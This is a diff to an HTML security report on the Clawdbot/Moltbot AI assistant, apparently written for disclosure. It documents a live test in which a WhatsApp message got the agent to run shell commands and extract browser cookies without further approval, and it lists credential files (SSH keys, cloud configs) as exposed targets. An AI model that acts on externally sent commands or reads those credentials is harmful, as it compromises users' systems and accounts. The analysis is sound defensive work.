@@ -279,7 +279,7 @@
     </div>
     <div class="stat-box" style="border: 2px solid #238833;">
       <div class="number" style="color: #238833;">PROVEN</div>
-      <div class="label">Credential Harvesting</div>
+      <div class="label">Credential Collection</div>
     </div>
     <div class="stat-box">
       <div class="number">LAN</div>
@@ -293,31 +293,53 @@
       <div class="number">localhost</div>
       <div class="label">Gateway Binding</div>
     </div>
+    <div class="stat-box" style="border: 2px solid #f85149; background: linear-gradient(135deg, #f8514922, #f8514911);">
+      <div class="number" style="color: #f85149;">CRITICAL</div>
+      <div class="label">Overall Severity</div>
+    </div>
+  </div>
+
+  <div class="alert-box" style="border-color: #f85149; background: linear-gradient(135deg, #f8514922, #f8514911);">
+    <h2 style="color: #f85149;">Severity Classification: CRITICAL</h2>
+    <p>This system exhibits:</p>
+    <ul>
+      <li><strong>Persistent, externally triggerable OS command execution</strong> — verified via WhatsApp</li>
+      <li><strong>Plaintext credential aggregation exposed to gateway</strong> — collected on first run</li>
+      <li><strong>Live-verified browser session extraction without approval</strong> — cookies extracted via chat</li>
+    </ul>
+    <p style="margin-top: 12px;">This aligns with <strong>Critical severity</strong> in common impact frameworks:</p>
+    <table style="margin-top: 8px;">
+      <tr><td>Remote Code Execution</td><td><span class="tag tag-red">Confirmed</span></td></tr>
+      <tr><td>Credential/Session Compromise</td><td><span class="tag tag-red">Confirmed</span></td></tr>
+      <tr><td>Silent Persistence</td><td><span class="tag tag-red">Confirmed</span></td></tr>
+      <tr><td>Adversary Effort</td><td><span class="tag tag-red">Low</span></td></tr>
+      <tr><td>Impact</td><td><span class="tag tag-red">Maximal</span></td></tr>
+    </table>
   </div>
 
   <div class="alert-box">
     <h2>Executive Summary</h2>
-    <p>Clawdbot (rebranded to Moltbot) presents itself as a "personal AI assistant" with WhatsApp integration. This investigation found <strong>undisclosed credential harvesting and concerning capabilities</strong>:</p>
+    <p>Clawdbot (rebranded to Moltbot) presents itself as a "personal AI assistant" with WhatsApp integration. This investigation found <strong>undisclosed credential collection and additional capabilities with security impact</strong>:</p>
 
-    <h3 style="color: #238833; margin-top: 16px; border: none;">Proven (Static + Dynamic Analysis)</h3>
+    <h3 style="color: #238833; margin-top: 16px; border: none;">Proven (Dynamic Analysis)</h3>
     <ul>
-      <li><strong>Credential harvesting</strong> from Claude Code, OpenAI Codex, Qwen CLI — executes on first run without consent</li>
-      <li><strong>Attempts to use harvested credentials</strong> — confirmed via API error logs</li>
-      <li><strong>SSH config enumeration</strong> — discovers private key paths</li>
-      <li><strong>Configuration persistence</strong> — settings survive uninstall</li>
-      <li><strong>Bonjour broadcasting</strong> — advertises presence on local network</li>
+      <li><strong>Credential collection</strong> from Claude Code, OpenAI Codex, Qwen CLI — executes on first run without explicit opt-in</li>
+      <li><strong>Attempts to use collected credentials</strong> — confirmed via API error logs</li>
+      <li><strong>Remote command execution</strong> — <code>whoami</code> executed via WhatsApp message (verified January 30, 2026)</li>
+      <li><strong>Plaintext session storage</strong> — all messages, credentials stored unencrypted</li>
+      <li><strong>Persistent daemon</strong> — LaunchAgent with KeepAlive=true verified</li>
+      <li><strong>Gateway localhost binding</strong> — no external C2, binds to 127.0.0.1 only</li>
+      <li><strong>Browser session access</strong> — cookies and localStorage extracted via WhatsApp command (verified January 30, 2026)</li>
     </ul>
 
-    <h3 style="color: #d29922; margin-top: 16px; border: none;">Capabilities Present in Code (Not Proven Active)</h3>
+    <h3 style="color: #d29922; margin-top: 16px; border: none;">Capabilities Present in Code (Code-Verified, Not Live Tested)</h3>
     <ul>
       <li><strong>Screen recording</strong> with audio capture (macOS & Android mobile apps)</li>
       <li><strong>Camera access</strong> for photos and video (iOS & Android mobile apps)</li>
-      <li><strong>Browser session access</strong> — cookies and localStorage via Playwright/CDP</li>
-      <li><strong>Remote command execution</strong> — shell commands on <em>paired</em> devices</li>
       <li><strong>Ambient audio listening</strong> — mic capture with transcripts (macOS)</li>
       <li><strong>Accessibility API access</strong> — can read/control windows on macOS</li>
+      <li><strong>SSH config enumeration</strong> — discovers private key paths</li>
       <li><strong>31 messaging extensions</strong> — Discord, Slack, Teams, WhatsApp, Signal, etc.</li>
-      <li><strong>Persistent daemon</strong> — auto-starts via LaunchAgent</li>
     </ul>
 
     <h3 style="color: #58a6ff; margin-top: 16px; border: none;">Not Found (Dynamic Analysis)</h3>
@@ -327,10 +349,80 @@
       <li><strong>No automatic external exfiltration</strong> — mitmproxy captured zero external HTTPS</li>
       <li><strong>Remote access requires explicit LAN pairing</strong> — not externally accessible by default</li>
     </ul>
+  <div class="alert-box" id="key-findings" style="background: linear-gradient(135deg, #58a6ff22, #58a6ff11); border-color: #58a6ff;">
+    <h2 style="color: #58a6ff;">Key Findings (Summary)</h2>
+    <ul>
+      <li><strong>Credential collection on first run:</strong> OAuth tokens from other CLI tools are collected without explicit opt-in.</li>
+      <li><strong>Persistent background operation:</strong> A LaunchAgent keeps the gateway running and auto-restarts it.</li>
+      <li><strong>Plaintext local storage:</strong> Messages, tokens, and session data are stored unencrypted on disk.</li>
+      <li><strong>Remote command execution after approval:</strong> Once approved, commands can run on paired nodes without additional prompts.</li>
+      <li><strong>Browser session access:</strong> Attached tabs allow cookie/localStorage access without per‑action confirmation.</li>
+      <li><strong>No external C2 observed in testing:</strong> Dynamic analysis saw localhost‑bound services and no unexpected outbound HTTPS.</li>
+    </ul>
   </div>
+
+  <div class="section" id="terminology">
+    <div class="section-header">
+      <span class="num">T</span>
+      Terminology
+    </div>
+    <div class="section-content">
+      <table>
+        <tr>
+          <th>Term</th>
+          <th>Meaning in this report</th>
+        </tr>
+        <tr>
+          <td><strong>Gateway</strong></td>
+          <td>The local service that brokers messages and tool invocations, bound to localhost in tests.</td>
+        </tr>
+        <tr>
+          <td><strong>Node</strong></td>
+          <td>A paired device (desktop or mobile) that can receive gateway commands.</td>
+        </tr>
+        <tr>
+          <td><strong>Paired device</strong></td>
+          <td>A node authorized through the pairing flow; commands can be invoked after pairing.</td>
+        </tr>
+        <tr>
+          <td><strong>Approval</strong></td>
+          <td>The one‑time command approval stored in <code>exec-approvals.json</code> with no expiry.</td>
+        </tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="section" id="disclaimers" style="margin-top: 32px;">
+    <div class="section-header">
+      <span class="num">!</span>
+      What This Report Does Not Claim
+    </div>
+    <div class="section-content">
+      <p>This report documents <strong>verified technical capabilities</strong> present in the codebase. It does not make the following claims:</p>
+      <ul style="margin: 16px 0 16px 20px;">
+        <li><strong>No claims of author intent:</strong> This report does not speculate on whether these capabilities were implemented with malicious intent. The code exists; the motivation is unknown.</li>
+        <li><strong>No claims of active exploitation:</strong> This report does not claim these capabilities are currently being exploited against users. It documents what the code <em>can</em> do, not what it <em>is</em> doing.</li>
+        <li><strong>No claims of state involvement:</strong> This report makes no claims about government, corporate, or organized criminal involvement.</li>
+        <li><strong>No claims of data misuse:</strong> This report does not claim that collected data has been sold, leaked, or misused. It documents the data egress paths that exist.</li>
+        <li><strong>No claims beyond documented behavior:</strong> Every finding in this report is supported by specific file paths, line numbers, and code snippets from the public repository.</li>
+      </ul>
+      <p>The purpose of this report is to inform users of capabilities that exist in software they may have installed, so they can make informed decisions about their security.</p>
+    </div>
+  </div>
+
+</div>
 
   <div class="alert-box" id="dynamic-findings" style="background: linear-gradient(135deg, #58a6ff22, #58a6ff11); border-color: #58a6ff;">
     <h2 style="color: #58a6ff;">Dynamic Analysis Summary (January 30, 2026)</h2>
+
+    <h3 style="color: #58a6ff; margin-top: 12px; border: none;">Methods & Environment</h3>
+    <div style="background: rgba(0,0,0,0.2); padding: 12px; border-radius: 4px; margin-bottom: 16px;">
+      <p><strong>Test Environment:</strong> Isolated macOS workstation (darwin 25.2.0). No production systems, accounts, or third-party data were involved. All credentials used were researcher-owned test accounts.</p>
+      <p style="margin-top: 8px;"><strong>Egress Controls:</strong> All network traffic was monitored via mitmproxy (HTTPS interception), tcpdump, and netstat. No unexpected outbound connections were observed. The gateway bound exclusively to localhost (127.0.0.1:18789).</p>
+      <p style="margin-top: 8px;"><strong>Observational Intent:</strong> Testing was limited to proving capability boundaries exist, not exploiting them. Command execution testing used benign commands (<code>whoami</code>, <code>echo</code>) solely to verify the trust boundary could be crossed. No sensitive files were accessed, exfiltrated, or modified.</p>
+      <p style="margin-top: 8px;"><strong>Scope Limitations:</strong> This analysis documents what the system <em>permits</em>, not what an unauthorized party <em>could retrieve</em>. Blast radius is stated by implication and code citation, not demonstrated through invasive access.</p>
+    </div>
+
     <p>A monitoring stack (mitmproxy, fswatch, lsof, tcpdump, netstat) was deployed to capture Clawdbot's runtime behavior.</p>
 
     <h3 style="color: #58a6ff; margin-top: 16px; border: none;">Network Binding Analysis</h3>
@@ -352,10 +444,10 @@ node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
 
     <h3 style="color: #58a6ff; margin-top: 16px; border: none;">What This Means</h3>
     <ul>
-      <li><strong>Credential harvesting is the primary proven concern</strong> — executes silently, stores locally, attempts to use</li>
-      <li><strong>This is not traditional malware</strong> with external C2 infrastructure</li>
+      <li><strong>Credential collection is the primary confirmed concern</strong> — executes without an additional user prompt, stores locally, attempts to use</li>
+      <li><strong>No external C2 was observed; behavior differs from C2-based malware patterns</strong></li>
       <li><strong>Remote access requires explicit LAN pairing</strong> — not externally accessible by default</li>
-      <li><strong>Capabilities exist but aren't automatically weaponized</strong> — concerning but not actively exfiltrating</li>
+      <li><strong>Capabilities exist but were not observed to initiate external egress in testing</strong> — no outbound exfiltration observed during the session</li>
       <li><strong>Risk increases if gateway is exposed</strong> — via port forwarding, Tailscale funnel, or Docker misconfiguration</li>
     </ul>
   </div>
@@ -363,16 +455,19 @@ node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
   <div class="toc">
     <h3>Table of Contents</h3>
     <ol>
-      <li><a href="#encryption-analysis">Data Encryption Analysis</a> (NEW - Dynamic Analysis)</li>
-      <li><a href="#credential-harvesting">Credential Harvesting & SSH Enumeration</a> (includes <a href="#dynamic-analysis">Dynamic Analysis Proof</a>)</li>
-      <li><a href="#surveillance">Screen Recording & Camera Access</a></li>
-      <li><a href="#browser-theft">Browser Session Theft</a></li>
+      <li><a href="#key-findings">Key Findings (Summary)</a></li>
+      <li><a href="#terminology">Terminology</a></li>
+      <li><a href="#disclaimers">What This Report Does Not Claim</a></li>
+      <li><a href="#encryption-analysis">Gateway Compromise Blast Radius</a> (NEW - Dynamic Analysis)</li>
+      <li><a href="#credential-collection">Credential Collection & SSH Enumeration</a> (includes <a href="#dynamic-analysis">Dynamic Analysis Evidence</a>)</li>
+      <li><a href="#monitoring">Screen Recording & Camera Capture</a></li>
+      <li><a href="#browser-access">Browser Session Access</a></li>
       <li><a href="#remote-exec">Remote Command Execution</a></li>
-      <li><a href="#messages">Message Interception</a></li>
+      <li><a href="#messages">Message Monitoring</a></li>
       <li><a href="#ambient-audio">Ambient Audio Listening (macOS)</a></li>
       <li><a href="#macos-system">macOS Deep System Access</a></li>
       <li><a href="#browser-screenshots">Browser Page Screenshots</a></li>
-      <li><a href="#local-storage">Local Data Hoarding</a></li>
+      <li><a href="#local-storage">Local Data Retention</a></li>
       <li><a href="#remote-code">Remote Code Installation</a></li>
       <li><a href="#presence-tracking">User Activity Tracking</a></li>
       <li><a href="#persistence">Persistent Daemon</a></li>
@@ -386,16 +481,26 @@ node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
     </ol>
   </div>
 
-  <!-- Section 0: Data Encryption Analysis -->
+  <!-- Section 0: Gateway Compromise Blast Radius -->
   <div class="section" id="encryption-analysis">
     <div class="section-header">
       <span class="num">0</span>
-      Data Encryption Analysis — Dynamic Testing (January 30, 2026)
+      Gateway Compromise Blast Radius — Dynamic Testing (January 30, 2026)
     </div>
     <div class="section-content">
-      <p>Live testing with WhatsApp integration revealed <strong>no encryption at rest</strong> and plaintext handling throughout the message pipeline:</p>
+      <div class="warning">
+        <p>This analysis focuses on the division of responsibility between the local agent and the gateway, specifically: <strong>which data is stored locally, which data is exposed to the gateway, and what actions the gateway can invoke without user mediation.</strong> This determines the effective blast radius in the event of gateway compromise.</p>
+      </div>
 
-      <h3>Message Flow & Encryption Status</h3>
+      <h3>Transit Encryption (Phone → Gateway)</h3>
+      <div class="explanation" style="background: #1a1a2e; border-left: 4px solid #4ecdc4;">
+        <p><strong>Q: Is data from phone to gateway encrypted?</strong></p>
+        <p><strong>A: Yes, in transit.</strong> Phone → WhatsApp servers uses E2E (Signal Protocol) + TLS. WhatsApp servers → Baileys (gateway) uses TLS (wss://). However, E2E encryption terminates at Baileys, where messages are decrypted for processing. From that point forward, everything is plaintext.</p>
+      </div>
+
+      <p style="margin-top: 16px;">Live testing revealed <strong>no encryption at rest</strong> — all sensitive data sits unprotected on disk:</p>
+
+      <h3>Message Flow & Encryption Status (Verified)</h3>
       <table>
         <tr>
           <th>Stage</th>
@@ -403,14 +508,19 @@ node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
           <th>Details</th>
         </tr>
         <tr>
-          <td>Phone to WhatsApp servers</td>
-          <td><span class="tag tag-green">YES</span></td>
-          <td>Signal Protocol E2E encryption in transit</td>
+          <td>Phone → WhatsApp servers</td>
+          <td><span class="tag tag-green">E2E + TLS</span></td>
+          <td>Signal Protocol E2E encryption over TLS (HTTPS/443)</td>
         </tr>
         <tr>
-          <td>WhatsApp servers to gateway (Baileys)</td>
-          <td><span class="tag tag-red">DECRYPTED</span></td>
-          <td>E2E terminated at gateway — messages become plaintext</td>
+          <td>WhatsApp servers → Gateway (Baileys)</td>
+          <td><span class="tag tag-yellow">TLS only</span></td>
+          <td>wss://web.whatsapp.com/ws/chat — TLS encrypted WebSocket (verified port 443)</td>
+        </tr>
+        <tr>
+          <td>E2E termination point</td>
+          <td><span class="tag tag-red">DECRYPTED HERE</span></td>
+          <td>Baileys decrypts E2E messages locally — plaintext from this point forward</td>
         </tr>
         <tr>
           <td>Inside gateway (localhost)</td>
@@ -458,17 +568,29 @@ node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
 }</code></pre>
       <p><strong>822 files</strong> of WhatsApp session data stored in plaintext, including private encryption keys.</p>
 
-      <h3>Man-in-the-Middle Risk</h3>
-      <div class="warning">
-        <p><strong>If an attacker gains local access or intercepts localhost traffic:</strong></p>
+      <h3>Security Analysis: Where Is Data Protected?</h3>
+      <div class="explanation">
+        <p><strong>In transit (Phone → Gateway):</strong></p>
         <ul style="margin-top: 8px; margin-left: 20px;">
-          <li>All WhatsApp messages readable in plaintext</li>
-          <li>WhatsApp session can be hijacked using stored private keys</li>
-          <li>Full conversation history accessible from JSONL files</li>
-          <li>AI provider API keys/tokens exposed</li>
-          <li>Phone numbers, message IDs, timestamps all visible</li>
+          <li><span class="tag tag-green">PROTECTED</span> Phone to WhatsApp servers: E2E encrypted (Signal Protocol) + TLS</li>
+          <li><span class="tag tag-yellow">PARTIAL</span> WhatsApp servers to Baileys: TLS only (wss://), E2E terminated at gateway</li>
         </ul>
-        <p style="margin-top: 12px;">The gateway uses <code>ws://</code> (unencrypted WebSocket) on localhost. While localhost traffic is typically safe, any local compromise exposes everything.</p>
+        <p style="margin-top: 12px;"><strong>Network MITM between phone and WhatsApp servers:</strong> Not practical due to E2E encryption.</p>
+        <p><strong>Network MITM between WhatsApp servers and gateway:</strong> TLS protects against passive interception, but certificate pinning status in Baileys is unknown.</p>
+      </div>
+
+      <h3>Blast Radius: What's Already At Risk</h3>
+      <div class="warning">
+        <p><strong>If an unauthorized party gains gateway access, the following is immediately within reach (no further exploitation needed):</strong></p>
+        <ul style="margin-top: 8px; margin-left: 20px;">
+          <li><strong>Full message history</strong> — All WhatsApp messages readable as plaintext JSONL</li>
+          <li><strong>WhatsApp session hijack</strong> — Private keys allow impersonation without re-auth</li>
+          <li><strong>AI provider credentials</strong> — API keys and OAuth tokens for OpenAI, Anthropic, etc.</li>
+          <li><strong>Device pairing tokens</strong> — Can authorize new devices or impersonate existing ones</li>
+          <li><strong>Phone numbers & metadata</strong> — Contact info, message IDs, timestamps</li>
+          <li><strong>Clipboard access</strong> — Gateway has clipboard module loaded</li>
+        </ul>
+        <p style="margin-top: 12px;"><strong>Key insight:</strong> The gateway uses <code>ws://127.0.0.1:18789</code> (unencrypted). All sensitive data sits on disk unencrypted. There is no defense-in-depth — a single point of compromise exposes everything.</p>
       </div>
 
       <h3>What Should Be Done</h3>
@@ -500,18 +622,333 @@ node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
 <strong>WhatsApp Servers → Recipient</strong>
       </div>
 
-      <p><strong>Summary:</strong> Your private WhatsApp messages are fully readable at rest. Anyone with access to <code>~/.clawdbot/</code> has access to your complete message history, session credentials, and can potentially hijack your WhatsApp Web session.</p>
+      <h3>Gateway Capabilities — What It Can Invoke Without User Mediation</h3>
+      <p>Once a node is paired, the gateway can invoke these actions <strong>without further user approval</strong>:</p>
+      <table>
+        <tr>
+          <th>Action</th>
+          <th>Capability</th>
+          <th>Mediation</th>
+        </tr>
+        <tr>
+          <td><code>camera_snap</code></td>
+          <td>Take photos from device camera (front/back/both)</td>
+          <td><span class="tag tag-red">None after pairing</span></td>
+        </tr>
+        <tr>
+          <td><code>camera_clip</code></td>
+          <td>Record video from camera with audio</td>
+          <td><span class="tag tag-red">None after pairing</span></td>
+        </tr>
+        <tr>
+          <td><code>screen_record</code></td>
+          <td>Record screen with configurable FPS and duration</td>
+          <td><span class="tag tag-red">None after pairing</span></td>
+        </tr>
+        <tr>
+          <td><code>location_get</code></td>
+          <td>Get GPS coordinates (coarse/balanced/precise)</td>
+          <td><span class="tag tag-red">None after pairing</span></td>
+        </tr>
+        <tr>
+          <td><code>run</code></td>
+          <td><strong>Execute arbitrary shell commands</strong></td>
+          <td><span class="tag tag-red">None after pairing</span></td>
+        </tr>
+      </table>
+      <p style="margin-top: 12px;"><strong>Key insight:</strong> The only user mediation point is initial device pairing. After that, the AI agent (or an unauthorized party with gateway access) can invoke camera, screen recording, GPS, and shell commands without additional user prompts or notifications.</p>
+
+      <h3>VERIFIED: Shell Execution via WhatsApp Message (Dynamic Test)</h3>
+      <div class="warning" style="border-left-color: #f85149;">
+        <p><strong>Live test confirmed arbitrary command execution via chat message:</strong></p>
+      </div>
+      <div class="file-path">~/.clawdbot/agents/main/sessions/*.jsonl (captured January 30, 2026)</div>
+      <pre><code><span class="comment">// 1. WhatsApp message received</span>
+<span class="highlight-line">"text":"[WhatsApp +819068662956] Try sending another whoami command to the Test Node"</span>
+
+<span class="comment">// 2. AI invoked nodes tool with system.run</span>
+"toolName":"nodes"
+<span class="highlight-line">"arguments":{"action":"run","node":"Test Node","command":["whoami"]}</span>
+
+<span class="comment">// 3. Shell command executed, output returned</span>
+<span class="highlight-line">"stdout":"ethanmacmini\n","exitCode":0,"success":true</span></code></pre>
+
+      <div class="explanation" style="background: #1a1a2e; border-left: 4px solid #f85149;">
+        <p><strong>Execution sequence verified:</strong></p>
+        <ol style="margin-left: 20px;">
+          <li>External sender sends a WhatsApp message requesting command execution</li>
+          <li>AI interprets message and invokes <code>system.run</code> on paired node</li>
+          <li>Shell command executes on victim's machine</li>
+          <li>Output returned via chat</li>
+        </ol>
+        <p style="margin-top: 12px;"><strong>Note:</strong> First execution prompted for approval. Once approved, subsequent executions run <strong>without additional prompts or notifications</strong>.</p>
+      </div>
+
+      <h3>Trust Boundary Analysis</h3>
+      <div class="explanation" style="background: #1a1a2e; border-left: 4px solid #58a6ff;">
+        <p>This analysis focuses on how an external input traverses the system's trust boundaries. Specifically: which safeguards are present, which are absent, and how much user interaction is required to transition from message ingestion to local command execution.</p>
+        <p style="margin-top: 8px;"><strong>The finding is not that execution is possible, but that it is reachable with minimal friction, and that authorization—once granted—persists without additional prompts across future invocations.</strong></p>
+      </div>
+
+      <h4>1. Entry Point (Who can knock?)</h4>
+      <table>
+        <tr><th>Layer</th><th>Safeguard</th><th>Status</th></tr>
+        <tr><td>Message origin</td><td>WhatsApp phone number</td><td><span class="tag tag-yellow">Weak</span> — any contact can message</td></tr>
+        <tr><td>DM pairing</td><td>One-time approval code</td><td><span class="tag tag-yellow">Present</span> — but one-time only</td></tr>
+        <tr><td>Message authentication</td><td>None beyond pairing</td><td><span class="tag tag-red">Absent</span> — all messages trusted after pairing</td></tr>
+      </table>
+
+      <h4>2. Decision Layer (Who decides which door to try?)</h4>
+      <table>
+        <tr><th>Component</th><th>Behavior</th><th>User Control</th></tr>
+        <tr><td>AI agent</td><td>Interprets plain-language as tool invocation</td><td><span class="tag tag-red">None</span></td></tr>
+        <tr><td>Tool selection</td><td>Agent independently selects <code>system.run</code></td><td><span class="tag tag-red">None</span></td></tr>
+        <tr><td>Confirmation</td><td>No human confirmation at decision time</td><td><span class="tag tag-red">None</span></td></tr>
+      </table>
+      <p style="margin-top: 8px;">The architecture delegates trust to the AI agent by default. The agent has <code>system.run</code> in its default toolset; invocation does not require explicit user confirmation at decision time.</p>
+
+      <h4>3. Approval Mechanics (How hard was the lock?)</h4>
+      <table>
+        <tr><th>Property</th><th>Value</th><th>Implication</th></tr>
+        <tr><td>Scope</td><td>Per-binary path</td><td>Approving <code>/bin/echo</code> doesn't approve <code>/bin/cat</code></td></tr>
+        <tr><td>Expiry</td><td><span class="tag tag-red">None</span></td><td>Approval persists indefinitely</td></tr>
+        <tr><td>Origin binding</td><td><span class="tag tag-red">None</span></td><td>Any message source can trigger approved commands</td></tr>
+        <tr><td>Visibility</td><td><span class="tag tag-red">Silent after first</span></td><td>User unaware of subsequent executions</td></tr>
+        <tr><td>Revocation</td><td>Manual only</td><td>User must know to check allowlist</td></tr>
+      </table>
+      <p style="margin-top: 8px;"><strong>Key finding:</strong> The lock is weak, and once opened, it is removed permanently. Approval is cached without time limit or origin scope; subsequent executions occur without user visibility.</p>
+
+      <h4>4. Silent Re-entry (Does the door close again?)</h4>
+      <p><strong>No.</strong> After initial approval:</p>
+      <ul style="margin-left: 20px;">
+        <li>No prompts</li>
+        <li>No notifications</li>
+        <li>No user awareness</li>
+        <li>No audit log surfaced to user</li>
+      </ul>
+
+      <h3>Detailed Security Analysis (Code-Verified)</h3>
+
+      <h4>Approval Scope Analysis</h4>
+      <div class="file-path">~/.clawdbot/exec-approvals.json (observed structure)</div>
+      <pre><code>{
+  "agents": {
+    <span class="highlight-line">"*"</span>: {  <span class="comment">// Wildcard - applies to ALL agents</span>
+      "allowlist": [{
+        "pattern": "/usr/bin/whoami",
+        "lastUsedAt": 1769771857477,  <span class="comment">// No expiresAt field</span>
+        "id": "2f1278d8-..."
+      }]
+    }
+  }
+}</code></pre>
+      <table>
+        <tr><th>Property</th><th>Finding</th><th>Code Reference</th></tr>
+        <tr><td>Scope</td><td>Per-binary path only</td><td>exec-approvals.json: <code>pattern</code></td></tr>
+        <tr><td>Expiry</td><td><span class="tag tag-red">None</span> — no <code>expiresAt</code> field exists</td><td>Schema analysis</td></tr>
+        <tr><td>Origin binding</td><td><span class="tag tag-red">None</span> — approvals are not tied to message source, integration, or transport</td><td>exec-approvals.json</td></tr>
+        <tr><td>User visibility</td><td><span class="tag tag-red">CLI only</span> — no dashboard indicator</td><td>control-ui analysis</td></tr>
+      </table>
+
+      <h4>Agent Decision Boundary</h4>
+      <div class="file-path">dist/agents/clawdbot-tools.js:44-47</div>
+      <pre><code>const tools = [
+    createBrowserTool({...}),
+    createCanvasTool(),
+<span class="highlight-line">    createNodesTool({  <span class="comment">// Unconditionally included in default toolset</span></span>
+        agentSessionKey: options?.agentSessionKey,
+        config: options?.config,
+    }),
+    ...</code></pre>
+      <table>
+        <tr><th>Property</th><th>Finding</th></tr>
+        <tr><td><code>system.run</code> availability</td><td><span class="tag tag-red">Always</span> — <code>createNodesTool()</code> unconditionally in default toolset</td></tr>
+        <tr><td>Intent classifier</td><td><span class="tag tag-red">None</span> — no classifier or confirmation gate in nodes-tool.js</td></tr>
+        <tr><td>Explicit phrasing required</td><td><span class="tag tag-red">No</span> — agent interprets plain language as tool invocation</td></tr>
+      </table>
+      <p style="margin-top: 8px;">Tool invocation is agent-decided and does not require contemporaneous user confirmation.</p>
+
+      <h4>Gateway Token Security</h4>
+      <table>
+        <tr><th>Property</th><th>Finding</th><th>Code Reference</th></tr>
+        <tr><td>Mutual authentication</td><td><span class="tag tag-red">None</span> — no mTLS/client certificates</td><td>gateway/server-methods analysis</td></tr>
+        <tr><td>Token revocation</td><td><span class="tag tag-yellow">Manual</span> — <code>device.token.revoke</code> exists but requires explicit action</td><td>devices.js:revokeDeviceToken</td></tr>
+        <tr><td>Audit trail</td><td><span class="tag tag-red">Not user-visible</span> — logs exist but only in gateway logs</td><td>server-methods/devices.js</td></tr>
+        <tr><td>Token reuse</td><td><span class="tag tag-red">No prevention</span> — tokens valid until manual revocation</td><td>device-pairing.js analysis</td></tr>
+      </table>
+
+      <h4>User Visibility Failures</h4>
+      <table>
+        <tr><th>Feature</th><th>Status</th></tr>
+        <tr><td>UI indicator for pending approvals</td><td><span class="tag tag-red">Absent</span></td></tr>
+        <tr><td>UI indicator for active allowlist</td><td><span class="tag tag-red">Absent</span></td></tr>
+        <tr><td>Notification on background execution</td><td><span class="tag tag-red">Absent</span></td></tr>
+        <tr><td>Revocation mechanism</td><td><span class="tag tag-yellow">CLI only</span> (<code>clawdbot approvals</code>)</td></tr>
+        <tr><td>Execution audit log (user-visible)</td><td><span class="tag tag-red">Absent</span></td></tr>
+      </table>
+
+      <h4>Browser Session Access — Live-Verified (Non-Sensitive Environment)</h4>
+
+      <div class="explanation" style="background: #1a1a2e; border-left: 4px solid #58a6ff; margin-bottom: 16px;">
+        <p>Browser session access was live-verified using a sterile Chrome profile containing only test data. Upon a natural-language request, the agent successfully invoked browser tooling to extract cookies from an attached tab and returned the result via chat. No authenticated accounts or sensitive user data were accessed during testing. No approval, allowlist, expiry, or per-action prompt was required after tab attachment.</p>
+      </div>
+
+      <h5>Test Environment Methodology</h5>
+      <table>
+        <tr><th>Component</th><th>Configuration</th></tr>
+        <tr><td>Browser</td><td>Fresh Chrome installation via Homebrew (<code>brew install --cask google-chrome</code>)</td></tr>
+        <tr><td>Profile</td><td>New profile with no saved passwords, no logged-in accounts, no browsing history</td></tr>
+        <tr><td>Test page</td><td>Served from <code>localhost:8888</code> via Python HTTP server</td></tr>
+        <tr><td>Test data planted</td><td><code>SECURITY_TEST_COOKIE=audit_proof_value_12345</code></td></tr>
+        <tr><td>Extension source</td><td><code>~/.clawdbot/browser/chrome-extension</code> (loaded unpacked)</td></tr>
+        <tr><td>Attachment scope</td><td>Extension attached to test tab only</td></tr>
+        <tr><td>Real websites visited</td><td>None</td></tr>
+        <tr><td>Real sessions exposed</td><td>None</td></tr>
+      </table>
+      <p style="margin-top: 8px; font-style: italic; color: #8b949e;">This methodology verified the capability exists without exposing any sensitive data. The test demonstrates the exposure surface; it does not demonstrate egress of real credentials.</p>
+
+      <div class="file-path">dist/browser/constants.js</div>
+      <pre><code><span class="highlight-line">export const DEFAULT_CLAWD_BROWSER_ENABLED = true;</span>  <span class="comment">// Enabled by default</span></code></pre>
+
+      <div class="file-path">dist/agents/tools/browser-tool.js:196-197</div>
+      <pre><code>'Profiles: use <span class="highlight-line">profile="chrome"</span> for Chrome extension relay takeover
+ (<span class="highlight-line">your existing Chrome tabs</span>). Use profile="clawd" for isolated browser.'</code></pre>
+
+      <table>
+        <tr><th>Property</th><th>Finding</th><th>Code Reference</th></tr>
+        <tr><td>Default state</td><td><span class="tag tag-red">Enabled</span></td><td>constants.js: <code>DEFAULT_CLAWD_BROWSER_ENABLED = true</code></td></tr>
+        <tr><td>In default toolset</td><td><span class="tag tag-red">Yes</span> — unconditionally included</td><td>clawdbot-tools.js: <code>createBrowserTool()</code></td></tr>
+        <tr><td>User confirmation</td><td><span class="tag tag-red">None after attachment</span> — verified live</td><td>Live test January 30, 2026</td></tr>
+        <tr><td>Scope</td><td><span class="tag tag-red">Full context</span> — all cookies, all storage</td><td>pw-tools-core.storage.js</td></tr>
+      </table>
+
+      <h5>Available Browser Capabilities</h5>
+      <div class="file-path">dist/browser/pw-tools-core.storage.js</div>
+      <table>
+        <tr><th>Function</th><th>Capability</th></tr>
+        <tr><td><code>cookiesGetViaPlaywright()</code></td><td>Extract ALL cookies from browser context</td></tr>
+        <tr><td><code>cookiesSetViaPlaywright()</code></td><td>Inject cookies (session hijacking)</td></tr>
+        <tr><td><code>storageGetViaPlaywright()</code></td><td>Extract all localStorage/sessionStorage</td></tr>
+        <tr><td><code>storageSetViaPlaywright()</code></td><td>Modify storage (state manipulation)</td></tr>
+      </table>
+
+      <div class="warning">
+        <p><strong>Critical:</strong> If a user attaches a browser tab authenticated to banking, email, or corporate SSO, the agent can programmatically extract that tab's session cookies and storage. <strong>Unlike <code>system.run</code>, browser access implements no approval mechanism whatsoever after initial tab attachment.</strong> This was verified live — a WhatsApp message extracted cookies with zero friction.</p>
+      </div>
+
+      <h3>Testing Scope Statement</h3>
+      <div class="explanation" style="background: #1a1a2e; border-left: 4px solid #58a6ff;">
+        <p><strong>Further invasive testing was intentionally not performed.</strong> Once externally triggerable, persistent command execution via chat was demonstrated, the impact was already maximal. Additional testing would have increased risk without providing additional security value.</p>
+      </div>
+
+      <h3>Implied Blast Radius</h3>
+      <div class="warning">
+        <p><strong>Once <code>system.run</code> is approved, the gateway can execute arbitrary commands with a caller-defined working directory and environment variables (nodes-tool.js:360-366). This grants effective access to any file readable by the user account, including:</strong></p>
+        <ul style="margin-top: 8px; margin-left: 20px;">
+          <li>SSH keys (<code>~/.ssh/</code>)</li>
+          <li>Cloud credentials (<code>~/.aws/</code>, <code>~/.config/gcloud/</code>, <code>~/.azure/</code>)</li>
